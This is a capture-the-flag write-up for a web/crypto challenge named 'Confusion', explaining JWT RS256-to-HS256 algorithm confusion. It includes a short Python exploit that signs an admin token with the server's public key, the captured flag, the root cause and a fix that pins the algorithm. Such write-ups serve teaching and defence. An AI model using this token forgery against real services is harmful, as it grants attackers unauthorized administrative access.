---
title: "Confusion — RS256→HS256 key confusion"
category: Crypto / Web
host: confusion.is-course.ru
tags: [jwt, algorithm-confusion, public-key-as-hmac-secret]
---

# Confusion

## TL;DR
The service verifies RS256 tokens but the library also accepts HS256. Signing an HS256 token with the
**public key** (which the app happily serves) makes the server validate the HMAC using that public key
as the shared secret — full forgery.

## Exploit
```python
import jwt, requests
pub = requests.get("https://confusion.is-course.ru/public.pem").text   # or from the page
tok = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
```
Present it to the protected endpoint with `role/user=admin` → flag
`Kryprographie_ist_kein_Ponyhof`.

## Root cause
Algorithm confusion happens when the verifier selects the algorithm from the token header and then
picks the key accordingly. Public keys are public, so any HS256 token "signed" with them is valid.

## Fix
Pin the algorithm server-side (`jwt.WithValidMethods([]string{"RS256"})`), and never let a PEM blob
double as an HMAC secret.
